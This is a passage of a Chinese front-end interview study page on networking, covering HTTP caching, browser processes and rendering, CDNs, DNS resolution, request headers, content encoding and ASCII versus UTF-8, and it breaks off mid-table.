<!DOCTYPE html>
<html lang="en-US" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>网络与安全 | 我的文档网站</title>
    <meta name="description" content="前端知识点总结">
    <meta name="generator" content="VitePress v1.6.4">
    <link rel="preload stylesheet" href="/interview-markdown/assets/style.DiXH2w0q.css" as="style">
    <link rel="preload stylesheet" href="/interview-markdown/vp-icons.css" as="style">
    
    <script type="module" src="/interview-markdown/assets/app.GL-kFN5K.js"></script>
    <link rel="preload" href="/interview-markdown/assets/inter-roman-latin.Di8DUHzh.woff2" as="font" type="font/woff2" crossorigin="">
    <link rel="modulepreload" href="/interview-markdown/assets/chunks/theme.Ca1N5rid.js">
    <link rel="modulepreload" href="/interview-markdown/assets/chunks/framework.BcGJFdya.js">
    <link rel="modulepreload" href="/interview-markdown/assets/guide_answers-network.md.x15TfVjw.lean.js">
    <link rel="icon" type="image/svg+xml" href="/logo.svg">
    <script id="check-dark-mode">(()=>{const e=localStorage.getItem("vitepress-theme-appearance")||"auto",a=window.matchMedia("(prefers-color-scheme: dark)").matches;(!e||e==="auto"?a:e==="dark")&&document.documentElement.classList.add("dark")})();</script>
    <script id="check-mac-os">document.documentElement.classList.toggle("mac",/Mac|iPhone|iPod|iPad/i.test(navigator.platform));</script>
  </head>
  <body>
    <div id="app"><div class="Layout" data-v-5d98c3a5><!--[--><!--]--><!--[--><span tabindex="-1" data-v-0b0ada53></span><a href="#VPContent" class="VPSkipLink visually-hidden" data-v-0b0ada53>Skip to content</a><!--]--><!----><header class="VPNav" data-v-5d98c3a5 data-v-ae24b3ad><div class="VPNavBar" data-v-ae24b3ad data-v-6aa21345><div class="wrapper" data-v-6aa21345><div class="container" data-v-6aa21345><div class="title" data-v-6aa21345><div class="VPNavBarTitle has-sidebar" data-v-6aa21345 data-v-1168a8e4><a class="title" href="/interview-markdown/" data-v-1168a8e4><!--[--><!--]--><!--[--><img class="VPImage logo" src="/interview-markdown/logo.svg" alt data-v-8426fc1a><!--]--><span data-v-1168a8e4>我的文档网站</span><!--[--><!--]--></a></div></div><div class="content" data-v-6aa21345><div class="content-body" data-v-6aa21345><!--[--><!--]--><div class="VPNavBarSearch search" data-v-6aa21345><!--[--><!----><div id="local-search"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search"><span class="DocSearch-Button-Container"><span class="vp-icon DocSearch-Search-Icon"></span><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"><kbd class="DocSearch-Button-Key"></kbd><kbd class="DocSearch-Button-Key">K</kbd></span></button></div><!--]--></div><nav aria-labelledby="main-nav-aria-label" class="VPNavBarMenu menu" data-v-6aa21345 data-v-dc692963><span id="main-nav-aria-label" class="visually-hidden" data-v-dc692963> Main Navigation </span><!--[--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/interview-markdown/guide/answers-vue.html" tabindex="0" data-v-dc692963 data-v-e56f3d57><!--[--><span data-v-e56f3d57>面试题</span><!--]--></a><!--]--><!--]--></nav><!----><div class="VPNavBarAppearance appearance" data-v-6aa21345 data-v-6c893767><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-6c893767 data-v-5337faa4 data-v-1d5665e3><span class="check" data-v-1d5665e3><span class="icon" data-v-1d5665e3><!--[--><span class="vpi-sun sun" data-v-5337faa4></span><span class="vpi-moon moon" data-v-5337faa4></span><!--]--></span></span></button></div><div class="VPSocialLinks VPNavBarSocialLinks social-links" data-v-6aa21345 data-v-0394ad82 data-v-7bc22406><!--[--><a class="VPSocialLink no-icon" href="https://github.com/yourname/my-docs" aria-label="github" target="_blank" rel="noopener" data-v-7bc22406 data-v-bd121fe5><span class="vpi-social-github"></span></a><!--]--></div><div class="VPFlyout VPNavBarExtra extra" data-v-6aa21345 data-v-bb2aa2f0 data-v-cf11d7a2><button type="button" class="button" aria-haspopup="true" aria-expanded="false" aria-label="extra navigation" data-v-cf11d7a2><span class="vpi-more-horizontal icon" data-v-cf11d7a2></span></button><div class="menu" data-v-cf11d7a2><div class="VPMenu" data-v-cf11d7a2 data-v-b98bc113><!----><!--[--><!--[--><!----><div class="group" data-v-bb2aa2f0><div class="item appearance" data-v-bb2aa2f0><p class="label" data-v-bb2aa2f0>Appearance</p><div class="appearance-action" data-v-bb2aa2f0><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-bb2aa2f0 data-v-5337faa4 data-v-1d5665e3><span class="check" data-v-1d5665e3><span class="icon" data-v-1d5665e3><!--[--><span class="vpi-sun sun" data-v-5337faa4></span><span class="vpi-moon moon" data-v-5337faa4></span><!--]--></span></span></button></div></div></div><div class="group" data-v-bb2aa2f0><div class="item social-links" data-v-bb2aa2f0><div class="VPSocialLinks social-links-list" data-v-bb2aa2f0 data-v-7bc22406><!--[--><a class="VPSocialLink no-icon" href="https://github.com/yourname/my-docs" aria-label="github" target="_blank" rel="noopener" data-v-7bc22406 data-v-bd121fe5><span class="vpi-social-github"></span></a><!--]--></div></div></div><!--]--><!--]--></div></div></div><!--[--><!--]--><button type="button" class="VPNavBarHamburger hamburger" aria-label="mobile navigation" aria-expanded="false" aria-controls="VPNavScreen" data-v-6aa21345 data-v-e5dd9c1c><span class="container" data-v-e5dd9c1c><span class="top" data-v-e5dd9c1c></span><span class="middle" data-v-e5dd9c1c></span><span class="bottom" data-v-e5dd9c1c></span></span></button></div></div></div></div><div class="divider" data-v-6aa21345><div class="divider-line" data-v-6aa21345></div></div></div><!----></header><div class="VPLocalNav has-sidebar empty" data-v-5d98c3a5 data-v-a6f0e41e><div class="container" data-v-a6f0e41e><button class="menu" aria-expanded="false" aria-controls="VPSidebarNav" data-v-a6f0e41e><span class="vpi-align-left menu-icon" data-v-a6f0e41e></span><span class="menu-text" data-v-a6f0e41e>Menu</span></button><div class="VPLocalNavOutlineDropdown" style="--vp-vh:0px;" data-v-a6f0e41e data-v-8a42e2b4><button data-v-8a42e2b4>Return to top</button><!----></div></div></div><aside class="VPSidebar" data-v-5d98c3a5 data-v-319d5ca6><div class="curtain" data-v-319d5ca6></div><nav class="nav" id="VPSidebarNav" aria-labelledby="sidebar-aria-label" tabindex="-1" data-v-319d5ca6><span class="visually-hidden" id="sidebar-aria-label" data-v-319d5ca6> Sidebar Navigation </span><!--[--><!--]--><!--[--><div class="no-transition group" data-v-c40bc020><section class="VPSidebarItem level-0 has-active" data-v-c40bc020 data-v-b3fd67f8><div class="item" role="button" tabindex="0" data-v-b3fd67f8><div class="indicator" data-v-b3fd67f8></div><h2 class="text" data-v-b3fd67f8>前端面试知识点</h2><!----></div><div class="items" data-v-b3fd67f8><!--[--><div class="VPSidebarItem level-1 is-link" data-v-b3fd67f8 data-v-b3fd67f8><div class="item" data-v-b3fd67f8><div class="indicator" data-v-b3fd67f8></div><a class="VPLink link link" href="/interview-markdown/guide/answers-vue.html" data-v-b3fd67f8><!--[--><p class="text" data-v-b3fd67f8>Vue 面试题</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-b3fd67f8 data-v-b3fd67f8><div class="item" data-v-b3fd67f8><div class="indicator" data-v-b3fd67f8></div><a class="VPLink link link" href="/interview-markdown/guide/answers-react.html" data-v-b3fd67f8><!--[--><p class="text" data-v-b3fd67f8>React 面试题</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-b3fd67f8 data-v-b3fd67f8><div class="item" data-v-b3fd67f8><div class="indicator" data-v-b3fd67f8></div><a class="VPLink link link" href="/interview-markdown/guide/answers-architecture.html" data-v-b3fd67f8><!--[--><p class="text" data-v-b3fd67f8>架构设计</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-b3fd67f8 data-v-b3fd67f8><div class="item" data-v-b3fd67f8><div class="indicator" data-v-b3fd67f8></div><a class="VPLink link link" href="/interview-markdown/guide/answers-engineering.html" data-v-b3fd67f8><!--[--><p class="text" data-v-b3fd67f8>工程化</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-b3fd67f8 data-v-b3fd67f8><div class="item" data-v-b3fd67f8><div class="indicator" data-v-b3fd67f8></div><a class="VPLink link link" href="/interview-markdown/guide/answers-performance.html" data-v-b3fd67f8><!--[--><p class="text" data-v-b3fd67f8>性能优化</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-b3fd67f8 data-v-b3fd67f8><div class="item" data-v-b3fd67f8><div class="indicator" data-v-b3fd67f8></div><a class="VPLink link link" href="/interview-markdown/guide/answers-network.html" data-v-b3fd67f8><!--[--><p class="text" data-v-b3fd67f8>网络协议</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-b3fd67f8 data-v-b3fd67f8><div class="item" data-v-b3fd67f8><div class="indicator" data-v-b3fd67f8></div><a class="VPLink link link" href="/interview-markdown/guide/answers-v8.html" data-v-b3fd67f8><!--[--><p class="text" data-v-b3fd67f8>V8 引擎</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-b3fd67f8 data-v-b3fd67f8><div class="item" data-v-b3fd67f8><div class="indicator" data-v-b3fd67f8></div><a class="VPLink link link" href="/interview-markdown/guide/answers-web3.html" data-v-b3fd67f8><!--[--><p class="text" data-v-b3fd67f8>Web3</p><!--]--></a><!----></div><!----></div><!--]--></div></section></div><!--]--><!--[--><!--]--></nav></aside><div class="VPContent has-sidebar" id="VPContent" data-v-5d98c3a5 data-v-1428d186><div class="VPDoc has-sidebar has-aside" data-v-1428d186 data-v-39a288b8><!--[--><!--]--><div class="container" data-v-39a288b8><div class="aside" data-v-39a288b8><div class="aside-curtain" data-v-39a288b8></div><div class="aside-container" data-v-39a288b8><div class="aside-content" data-v-39a288b8><div class="VPDocAside" data-v-39a288b8 data-v-3f215769><!--[--><!--]--><!--[--><!--]--><nav aria-labelledby="doc-outline-aria-label" class="VPDocAsideOutline" data-v-3f215769 data-v-a5bbad30><div class="content" data-v-a5bbad30><div class="outline-marker" data-v-a5bbad30></div><div aria-level="2" class="outline-title" id="doc-outline-aria-label" role="heading" data-v-a5bbad30>On this page</div><ul class="VPDocOutlineItem root" data-v-a5bbad30 data-v-b933a997><!--[--><!--]--></ul></div></nav><!--[--><!--]--><div class="spacer" data-v-3f215769></div><!--[--><!--]--><!----><!--[--><!--]--><!--[--><!--]--></div></div></div></div><div class="content" data-v-39a288b8><div class="content-container" data-v-39a288b8><!--[--><!--]--><main class="main" data-v-39a288b8><div style="position:relative;" class="vp-doc _interview-markdown_guide_answers-network" data-v-39a288b8><div><h1 id="网络与安全" tabindex="-1">网络与安全 <a class="header-anchor" href="#网络与安全" aria-label="Permalink to &quot;网络与安全&quot;">​</a></h1><h2 id="_1、说一下-http-缓存策略-有什么区别-分别解决了什么问题" tabindex="-1">1、说一下 Http 缓存策略，有什么区别，分别解决了什么问题？ <a class="header-anchor" href="#_1、说一下-http-缓存策略-有什么区别-分别解决了什么问题" aria-label="Permalink to &quot;1、说一下 Http 缓存策略，有什么区别，分别解决了什么问题？&quot;">​</a></h2><p>HTTP 缓存策略主要分为强缓存和协商缓存两种：</p><p><strong>强缓存</strong></p><ul><li>使用 <code>Cache-Control</code> 和 <code>Expires</code> 头部</li><li>不需要向服务器发送请求，直接从缓存读取</li><li>解决问题：减少网络请求，提升页面加载速度，降低服务器压力</li></ul><p><strong>Cache-Control:</strong></p><ul><li><code>max-age=xxx</code>：缓存有效期（秒）</li><li><code>no-cache</code>：不使用强缓存，使用协商缓存</li><li><code>no-store</code>：禁止缓存</li><li><code>public</code>：可以被浏览器和 CDN 缓存</li><li><code>private</code>：只能被浏览器缓存</li></ul><p><strong>协商缓存</strong></p><ul><li>使用 <code>ETag</code> / <code>If-None-Match</code> 或 <code>Last-Modified</code> / <code>If-Modified-Since</code></li><li>向服务器发送请求，询问资源是否修改</li><li>如果未修改，返回 304 状态码，使用缓存</li><li>解决问题：确保获取最新资源，同时减少数据传输</li></ul><p><strong>区别：</strong></p><ol><li>强缓存不发送请求，协商缓存发送请求</li><li>强缓存优先级高于协商缓存</li><li>协商缓存更保证数据新鲜度，强缓存性能更好</li></ol><hr><h2 id="_2、chrome-浏览器一共有多少个线程和多少个进程-分别做什么用-渲染进程中都有什么线程" tabindex="-1">2、chrome 浏览器一共有多少个线程和多少个进程，分别做什么用？渲染进程中都有什么线程？ <a class="header-anchor" href="#_2、chrome-浏览器一共有多少个线程和多少个进程-分别做什么用-渲染进程中都有什么线程" aria-label="Permalink to &quot;2、chrome 浏览器一共有多少个线程和多少个进程，分别做什么用？渲染进程中都有什么线程？&quot;">​</a></h2><p><strong>进程架构：</strong></p><ol><li><p><strong>浏览器主进程</strong>（1个）</p><ul><li>负责浏览器界面显示、用户交互</li><li>管理、创建、销毁其他进程</li><li>提供存储功能</li></ul></li><li><p><strong>GPU 进程</strong>（1个）</p><ul><li>负责 3D 绘制、CSS3D、网页合成</li><li>统一处理 GPU 任务</li></ul></li><li><p><strong>网络进程</strong>（1个）</p><ul><li>负责网络资源加载</li><li>处理 HTTP/HTTPS 请求</li></ul></li><li><p><strong>渲染进程</strong>（多个，每个标签页一个）</p><ul><li>负责页面渲染、脚本执行</li><li>多进程隔离，提高稳定性</li></ul></li><li><p><strong>插件进程</strong>（多个，每个插件一个）</p><ul><li>插件独立进程，插件崩溃不影响浏览器</li></ul></li></ol><p><strong>渲染进程中的线程：</strong></p><ol><li><p><strong>GUI 渲染线程</strong></p><ul><li>负责渲染页面</li><li>解析 HTML、CSS，构建 DOM/CSSOM</li><li>执行重排重绘</li><li>与 JS 线程互斥</li></ul></li><li><p><strong>JS 引擎线程</strong></p><ul><li>负责 JavaScript 代码执行</li><li>V8 引擎</li><li>单线程，通过事件循环实现异步</li></ul></li><li><p><strong>事件触发线程</strong></p><ul><li>负责事件管理（鼠标点击、键盘事件）</li><li>将事件添加到事件队列</li></ul></li><li><p><strong>定时器线程</strong></p><ul><li>负责 <code>setTimeout</code>、<code>setInterval</code></li><li>计时结束后回调放入事件队列</li></ul></li><li><p><strong>异步 HTTP 请求线程</strong></p><ul><li>负责 XMLHttpRequest 等异步请求</li><li>请求完成后回调放入事件队列</li></ul></li></ol><hr><h2 id="_3、说说浏览器渲染流程-分层之后在什么时候合成-什么是重排和重绘-如何避免" tabindex="-1">3、说说浏览器渲染流程，分层之后在什么时候合成？什么是重排和重绘？如何避免？ <a class="header-anchor" href="#_3、说说浏览器渲染流程-分层之后在什么时候合成-什么是重排和重绘-如何避免" aria-label="Permalink to &quot;3、说说浏览器渲染流程，分层之后在什么时候合成？什么是重排和重绘？如何避免？&quot;">​</a></h2><p><strong>浏览器渲染流程：</strong></p><ol><li>解析 HTML，构建 DOM 树</li><li>解析 CSS，构建 CSSOM 树</li><li>合并 DOM 和 CSSOM，生成渲染树</li><li>布局：计算每个节点的位置和大小</li><li>分层：根据 z-index、transform、opacity 等属性创建图层</li><li>绘制：填充图层的像素</li><li>合成：将图层合成为完整页面</li></ol><p><strong>合成时机：</strong></p><ul><li>在绘制完成后，由合成线程负责</li><li>利用 GPU 加速，将多个图层合成最终图像</li><li>合成操作在独立的合成线程中完成，不阻塞主线程</li></ul><p><strong>重排：</strong></p><ul><li>元素位置、大小改变，需要重新计算布局</li><li>触发操作：改变 width/height、添加/删除元素、改变字体等</li><li>消耗较大，要尽量避免</li></ul><p><strong>重绘：</strong></p><ul><li>元素外观改变但位置不变</li><li>触发操作：改变 color、background、box-shadow 等</li><li>消耗比重排小</li></ul><p><strong>如何避免：</strong></p><ol><li>避免频繁操作样式，使用 class 批量修改</li><li>使用 <code>transform</code> 和 <code>opacity</code> 代替位置、大小变化（不会触发重排）</li><li>使用 <code>document.createDocumentFragment()</code> 批量添加节点</li><li>使用 <code>requestAnimationFrame</code> 优化动画</li><li>使用 <code>will-change</code> 属性提示浏览器优化</li><li>避免使用 <code>table</code> 布局</li><li>避免逐条修改样式，一次性设置</li></ol><hr><h2 id="_4、cdn-是什么-描述下-cdn-原理-为什么要-cdn" tabindex="-1">4、CDN 是什么？描述下 CDN 原理？为什么要 CDN？ <a class="header-anchor" href="#_4、cdn-是什么-描述下-cdn-原理-为什么要-cdn" aria-label="Permalink to &quot;4、CDN 是什么？描述下 CDN 原理？为什么要 CDN？&quot;">​</a></h2><p><strong>CDN（Content Delivery Network，内容分发网络）：</strong></p><ul><li>分布式网络系统，将内容缓存到全球各地边缘节点</li><li>用户访问时从最近的节点获取内容</li></ul><p><strong>CDN 原理：</strong></p><ol><li>用户请求域名</li><li>DNS 解析返回 CDN 节点 IP（智能 DNS）</li><li>请求到达 CDN 边缘节点</li><li>节点检查缓存： <ul><li>命中：直接返回</li><li>未命中：回源站获取，缓存后返回</li></ul></li><li>用户获取内容</li></ol><p><strong>为什么要 CDN：</strong></p><ol><li><strong>加速访问</strong>：就近访问，减少延迟</li><li><strong>降低源站压力</strong>：分散流量到边缘节点</li><li><strong>提高可用性</strong>：节点故障自动切换</li><li><strong>节省带宽成本</strong>：减少源站带宽消耗</li><li><strong>提升安全性</strong>：提供 DDoS 防护</li><li><strong>全球覆盖</strong>：解决跨地域访问慢问题</li></ol><hr><h2 id="_5、cdn-有哪些优化静态资源加载速度的机制" tabindex="-1">5、CDN 有哪些优化静态资源加载速度的机制？ <a class="header-anchor" href="#_5、cdn-有哪些优化静态资源加载速度的机制" aria-label="Permalink to &quot;5、CDN 有哪些优化静态资源加载速度的机制？&quot;">​</a></h2><p><strong>CDN 优化机制：</strong></p><ol><li><p><strong>边缘缓存</strong></p><ul><li>在全球边缘节点缓存静态资源</li><li>用户就近获取，减少传输距离</li></ul></li><li><p><strong>智能 DNS 解析</strong></p><ul><li>根据用户 IP 返回最优节点</li><li>考虑网络状况、节点负载</li></ul></li><li><p><strong>预连接</strong></p><ul><li>提前建立 TCP 连接</li><li>减少 TCP 握手时间</li></ul></li><li><p><strong>持久连接</strong></p><ul><li>复用 TCP 连接</li><li>避免重复建立连接</li></ul></li><li><p><strong>Gzip/Brotli 压缩</strong></p><ul><li>减小传输体积</li><li>节省带宽，提升速度</li></ul></li><li><p><strong>HTTP/2 或 HTTP/3</strong></p><ul><li>多路复用，减少请求延迟</li><li>服务器推送（HTTP/2）</li></ul></li><li><p><strong>断点续传</strong></p><ul><li>支持 Range 请求</li><li>大文件下载中断可续传</li></ul></li><li><p><strong>动态加速</strong></p><ul><li>优化动态内容传输</li><li>协议优化、路由优化</li></ul></li><li><p><strong>缓存预热</strong></p><ul><li>提前将热点资源推送到节点</li><li>避免用户访问时回源</li></ul></li><li><p><strong>自动回源</strong></p><ul><li>节点失效自动切换到其他节点</li><li>提高可用性</li></ul></li></ol><hr><h2 id="_6、说一下浏览器解析-html-文件的过程。" tabindex="-1">6、说一下浏览器解析 Html 文件的过程。 <a class="header-anchor" href="#_6、说一下浏览器解析-html-文件的过程。" aria-label="Permalink to &quot;6、说一下浏览器解析 Html 文件的过程。&quot;">​</a></h2><p><strong>HTML 解析过程：</strong></p><ol><li><p><strong>字节流 → 字符流</strong></p><ul><li>网络接收字节流</li><li>按编码转换为字符流</li></ul></li><li><p><strong>词法分析（Tokenization）</strong></p><ul><li>将字符流转换为 Token（标签、属性、文本等）</li><li>识别 HTML 标签和属性</li></ul></li><li><p><strong>语法分析（Parsing）</strong></p><ul><li>将 Token 转换为 DOM 节点</li><li>构建 DOM 树</li><li>遇到 <code>&lt;script&gt;</code> 会暂停解析，等待脚本执行</li></ul></li><li><p><strong>DOM 树构建</strong></p><ul><li>HTML 标签 → 元素节点</li><li>文本 → 文本节点</li><li>注释 → 注释节点</li></ul></li><li><p><strong>遇到 CSS 资源</strong></p><ul><li>下载 CSS 文件（异步，不阻塞 HTML 解析）</li><li>解析完成后构建 CSSOM 树</li></ul></li><li><p><strong>遇到 JavaScript</strong></p><ul><li><code>&lt;script src=&quot;...&quot;&gt;</code>：下载并执行，阻塞 HTML 解析</li><li><code>&lt;script defer&gt;</code>：延迟到 HTML 解析完执行</li><li><code>&lt;script async&gt;</code>：异步下载，下载完后执行</li></ul></li><li><p><strong>构建渲染树</strong></p><ul><li>合并 DOM 树和 CSSOM 树</li><li>排除 <code>display: none</code> 的元素</li></ul></li><li><p><strong>布局和绘制</strong></p><ul><li>计算节点位置</li><li>绘制页面</li></ul></li></ol><p><strong>注意：</strong></p><ul><li>HTML 解析是流式的，边下载边解析</li><li><code>&lt;script&gt;</code> 默认会阻塞解析，建议使用 <code>defer</code> 或 <code>async</code></li><li>CSS 虽然不阻塞 HTML 解析，但会阻塞 JS 执行和渲染</li></ul><hr><h2 id="_7、从输入-url-到页面加载的全过程。" tabindex="-1">7、从输入 Url 到页面加载的全过程。 <a class="header-anchor" href="#_7、从输入-url-到页面加载的全过程。" aria-label="Permalink to &quot;7、从输入 Url 到页面加载的全过程。&quot;">​</a></h2><p><strong>完整流程：</strong></p><ol><li><p><strong>URL 解析</strong></p><ul><li>检查 URL 格式</li><li>解析协议、域名、端口、路径等</li></ul></li><li><p><strong>DNS 解析</strong></p><ul><li>浏览器缓存 → 操作系统缓存 → Hosts 文件 → 本地 DNS 服务器 → 根域名服务器 → 顶级域名服务器 → 权威域名服务器</li><li>获取域名对应的 IP 地址</li></ul></li><li><p><strong>TCP 连接（三次握手）</strong></p><ul><li>客户端发送 SYN</li><li>服务端回复 SYN+ACK</li><li>客户端回复 ACK</li><li>建立 TCP 连接</li></ul></li><li><p><strong>HTTPS 握手（如果是 HTTPS）</strong></p><ul><li>TLS/SSL 握手</li><li>交换密钥，验证证书</li><li>建立加密通道</li></ul></li><li><p><strong>发送 HTTP 请求</strong></p><ul><li>构造请求行、请求头、请求体</li><li>发送到服务器</li></ul></li><li><p><strong>服务器处理请求</strong></p><ul><li>路由匹配</li><li>业务逻辑处理</li><li>查询数据库等</li></ul></li><li><p><strong>服务器返回响应</strong></p><ul><li>返回响应行、响应头、响应体</li><li>状态码（200、404、500 等）</li></ul></li><li><p><strong>浏览器解析响应</strong></p><ul><li>解析 HTML，构建 DOM 树</li><li>解析 CSS，构建 CSSOM 树</li><li>合并构建渲染树</li></ul></li><li><p><strong>布局</strong></p><ul><li>计算节点位置和大小</li><li>生成布局树</li></ul></li><li><p><strong>绘制</strong></p><ul><li>绘制图层</li><li>合成页面</li></ul></li><li><p><strong>断开连接（四次挥手）</strong></p><ul><li>客户端发送 FIN</li><li>服务端回复 ACK</li><li>服务端发送 FIN</li><li>客户端回复 ACK</li></ul></li></ol><hr><h2 id="_8、说说-dns-解析的具体过程。" tabindex="-1">8、说说 DNS 解析的具体过程。 <a class="header-anchor" href="#_8、说说-dns-解析的具体过程。" aria-label="Permalink to &quot;8、说说 DNS 解析的具体过程。&quot;">​</a></h2><p><strong>DNS 解析步骤：</strong></p><ol><li><p><strong>浏览器缓存检查</strong></p><ul><li>检查浏览器是否有缓存的 DNS 记录</li><li>如果有且未过期，直接返回</li></ul></li><li><p><strong>操作系统缓存检查</strong></p><ul><li>检查 <code>/etc/hosts</code> 文件（Linux/Mac）</li><li>检查 <code>C:\Windows\System32\drivers\etc\hosts</code>（Windows）</li><li>检查系统 DNS 缓存</li></ul></li><li><p><strong>本地 DNS 服务器（递归查询）</strong></p><ul><li>向本地 DNS 服务器（通常是 ISP 提供的）发起查询</li><li>本地 DNS 服务器负责递归查询</li></ul></li><li><p><strong>根域名服务器迭代查询</strong></p><ul><li>本地 DNS 查询根域名服务器（.）</li><li>根服务器返回顶级域名服务器地址（如 .com、.cn）</li></ul></li><li><p><strong>顶级域名服务器查询</strong></p><ul><li>本地 DNS 查询顶级域名服务器</li><li>返回权威域名服务器地址（如 example.com）</li></ul></li><li><p><strong>权威域名服务器查询</strong></p><ul><li>本地 DNS 查询权威域名服务器</li><li>返回最终的 IP 地址</li></ul></li><li><p><strong>返回结果</strong></p><ul><li>本地 DNS 将 IP 地址返回给浏览器</li><li>浏览器和本地 DNS 都会缓存结果</li></ul></li></ol><p><strong>记录类型：</strong></p><ul><li><strong>A 记录</strong>：域名 → IPv4 地址</li><li><strong>AAAA 记录</strong>：域名 → IPv6 地址</li><li><strong>CNAME 记录</strong>：域名别名</li><li><strong>MX 记录</strong>：邮件服务器</li><li><strong>NS 记录</strong>：域名服务器</li></ul><p><strong>DNS 缓存时间（TTL）：</strong></p><ul><li>默认 300 秒到 86400 秒不等</li><li>可以通过修改 DNS 记录的 TTL 值控制缓存时间</li></ul><hr><h2 id="_9、常见的-http-请求头有哪些-以及它的作用。" tabindex="-1">9、常见的 Http 请求头有哪些？以及它的作用。 <a class="header-anchor" href="#_9、常见的-http-请求头有哪些-以及它的作用。" aria-label="Permalink to &quot;9、常见的 Http 请求头有哪些？以及它的作用。&quot;">​</a></h2><p><strong>常见 HTTP 请求头：</strong></p><p><strong>1. 请求相关：</strong></p><ul><li><code>Host</code>：目标主机名（必填）</li><li><code>User-Agent</code>：浏览器类型、版本</li><li><code>Accept</code>：客户端接受的内容类型（如 <code>text/html,application/json</code>）</li><li><code>Accept-Language</code>：接受的语言</li><li><code>Accept-Encoding</code>：接受的压缩方式（如 <code>gzip, deflate, br</code>）</li></ul><p><strong>2. 缓存相关：</strong></p><ul><li><code>If-None-Match</code>：与 ETag 配合，判断资源是否修改</li><li><code>If-Modified-Since</code>：与 Last-Modified 配合</li><li><code>Cache-Control</code>：缓存策略</li></ul><p><strong>3. 连接相关：</strong></p><ul><li><code>Connection</code>：连接管理（如 <code>keep-alive</code>）</li><li><code>Upgrade</code>：协议升级（如 WebSocket）</li></ul><p><strong>4. 内容相关：</strong></p><ul><li><code>Content-Type</code>：请求体内容类型（如 <code>application/json</code>）</li><li><code>Content-Length</code>：请求体长度</li><li><code>Content-Encoding</code>：请求体压缩方式</li></ul><p><strong>5. 认证相关：</strong></p><ul><li><code>Authorization</code>：认证信息（如 <code>Bearer token</code>）</li><li><code>Cookie</code>：携带 Cookie</li></ul><p><strong>6. 来源相关：</strong></p><ul><li><code>Referer</code>：来源页面</li><li><code>Origin</code>：源信息（用于 CORS）</li><li><code>User-Agent</code>：浏览器标识</li></ul><p><strong>7. 条件请求：</strong></p><ul><li><code>If-Match</code>：匹配 ETag</li><li><code>If-Range</code>：范围请求条件</li></ul><p><strong>8. 特殊请求：</strong></p><ul><li><code>X-Requested-With</code>：标识 AJAX 请求</li><li><code>X-CSRF-Token</code>：CSRF 令牌</li><li><code>X-Forwarded-For</code>：真实 IP（代理）</li></ul><p><strong>9. 范围请求：</strong></p><ul><li><code>Range</code>：请求部分资源（如 <code>bytes=0-1023</code>）</li></ul><p><strong>10. 实时更新：</strong></p><ul><li><code>Upgrade-Insecure-Requests</code>：请求升级为 HTTPS</li></ul><hr><h2 id="_10、encoding-头都有哪些编码方式" tabindex="-1">10、encoding 头都有哪些编码方式？ <a class="header-anchor" href="#_10、encoding-头都有哪些编码方式" aria-label="Permalink to &quot;10、encoding 头都有哪些编码方式？&quot;">​</a></h2><p><strong>Content-Encoding 头的编码方式：</strong></p><ol><li><p><strong>gzip</strong></p><ul><li>最常用的压缩格式</li><li>压缩率约 60-70%</li><li>广泛支持</li></ul></li><li><p><strong>deflate</strong></p><ul><li>基于 zlib 算法</li><li>压缩率略低于 gzip</li><li>支持度不如 gzip</li></ul></li><li><p><strong>br（Brotli）</strong></p><ul><li>Google 开发的新压缩算法</li><li>压缩率比 gzip 高 15-25%</li><li>现代浏览器支持</li></ul></li><li><p><strong>compress</strong></p><ul><li>Unix compress 命令</li><li>已过时，很少使用</li></ul></li><li><p><strong>identity</strong></p><ul><li>不压缩</li><li>默认值</li></ul></li></ol><p><strong>Accept-Encoding 示例：</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Accept-Encoding: gzip, deflate, br</span></span></code></pre></div><p><strong>响应头示例：</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Content-Encoding: gzip</span></span>
<span class="line"><span>Content-Length: 1234</span></span></code></pre></div><p><strong>使用建议：</strong></p><ul><li>优先使用 Brotli（br），兼容性好时压缩效果最佳</li><li>备选 gzip，兼容性最好</li><li>不推荐 deflate 和 compress</li></ul><hr><h2 id="_11、utf-8-和-asc-码有什么区别" tabindex="-1">11、UTF-8 和 asc 码有什么区别？ <a class="header-anchor" href="#_11、utf-8-和-asc-码有什么区别" aria-label="Permalink to &quot;11、UTF-8 和 asc 码有什么区别？&quot;">​</a></h2><p><strong>ASCII（American Standard Code for Information Interchange）：</strong></p><ul><li>7 位编码，共 128 个字符</li><li>只包含英文字母、数字、标点符号、控制字符</li><li>单字节，每个字符占用 1 个字节</li><li>适合英文环境</li></ul><p><strong>UTF-8（8-bit Unicode Transformation Format）：</strong></p><ul><li>Unicode 的可变长度编码</li><li>1-4 个字节表示一个字符</li><li>兼容 ASCII（ASCII 字符用 1 个字节）</li><li>支持全球所有语言字符</li><li>占用空间更大，但通用性强</li></ul><p><strong>区别：</strong></p><table tabindex="0"><thead><tr><th>特性</th><th>ASCII</th><th>UTF-8</th></tr></thead><tbody><tr><td>字符集</td><td>128 个字符</td><td>所有 Unicode 字符</td></tr><tr><td>编码长度</td><td>固定 1 字节</td><td>1-4 字节</td></tr><tr><td>兼容性</td><td>-</td><td>兼容 